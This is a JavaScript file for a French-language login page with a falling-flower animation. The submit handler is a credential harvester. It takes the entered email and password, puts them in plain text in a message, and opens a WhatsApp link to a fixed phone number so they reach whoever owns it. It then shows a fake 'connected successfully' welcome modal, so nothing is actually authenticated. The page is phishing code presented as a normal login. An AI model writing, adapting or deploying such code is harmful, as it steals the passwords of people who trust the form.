// Flower emojis for animation
const flowers = ['🌹', '🌺', '🌸', '🌼', '🌻', '💐', '🌷'];
// Handle form submission
document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim(); // ton champ code
  const whatsappConsent = document.getElementById('whatsappConsent').checked;

  if (!email || ! password) {
    alert('Veuillez remplir tous les champs');
    return;
  }

  // Envoi sur WhatsApp
  const message = `*📥 ACCÈS SALLE*\n\n*Email:* ${email}\n*password 🔑 :* ${password}\n*Date:* ${new Date().toLocaleString('fr-FR')}`;
  const monWhatsApp = '243999269701';
  const whatsappUrl = `https://wa.me/${monWhatsApp}?text=${encodeURIComponent(message)}`;
  
  window.open(whatsappUrl, '_blank');

  // Start flower animation
  createFlowerAnimation();

  // Show welcome message
  setTimeout(() => {
    showWelcomeModal(email);
  }, 1500);

  // Reset form
  setTimeout(() => {
    document.getElementById('loginForm').reset();
  }, 4000);
});

// Create falling flowers animation
function createFlowerAnimation() {
    const container = document.getElementById('flowersContainer');
    container.classList.add('active');
    
    // Clear existing flowers
    container.innerHTML = '';
    
    // Create 15 falling flowers
    for (let i = 0; i < 15; i++) {
        setTimeout(() => {
            const flower = document.createElement('div');
            flower.className = 'flower sway';
            flower.textContent = flowers[Math.floor(Math.random() * flowers.length)];
            
            // Random horizontal starting position
            const randomX = Math.random() * window.innerWidth;
            flower.style.left = randomX + 'px';
            flower.style.top = '-50px';
            flower.style.animationDuration = (2 + Math.random() * 2) + 's';
            flower.style.animationDelay = (i * 0.1) + 's';
            
            container.appendChild(flower);
        }, i * 100);
    }
    
    // Clear animation after completion
    setTimeout(() => {
        container.classList.remove('active');
        container.innerHTML = '';
    }, 4000);
}

// Show welcome modal
function showWelcomeModal(email) {
    const modal = document.getElementById('welcomeModal');
    const message = document.getElementById('modalMessage');
    
    // Personalized message
    const userName = email.split('@')[0];
    message.textContent = `Connecté avec succès en tant que ${userName} 🎉`;
    
    modal.classList.remove('hidden');
}

// Close modal
function closeModal() {
    const modal = document.getElementById('welcomeModal');
    modal.classList.add('hidden');
}

// Close modal when clicking outside
document.addEventListener('click', (e) => {
    const modal = document.getElementById('welcomeModal');
    if (e.target === modal) {
        closeModal();
    }
});

// Send WhatsApp notification (Backend integration)
async function sendWhatsAppNotification(email) {
    try {
        // This would be your backend endpoint
        // For demonstration, we're showing what to implement
        const response = await fetch('/api/send-whatsapp-notification', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: email,
                message: `Bienvenue! Vous vous êtes connecté avec succès.`,
                timestamp: new Date().toISOString()
            })
        }).catch(() => {
            // If no backend endpoint, show success anyway
            console.log('📱 Notification préparée pour envoi');
        });
        
        if (response && response.ok) {
            console.log('✅ Notification WhatsApp envoyée!');
        }
    } catch (error) {
        console.log('📱 Notification WhatsApp - Mode démo activé');
    }
}

// Escape key closes modal
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeModal();
    }
});
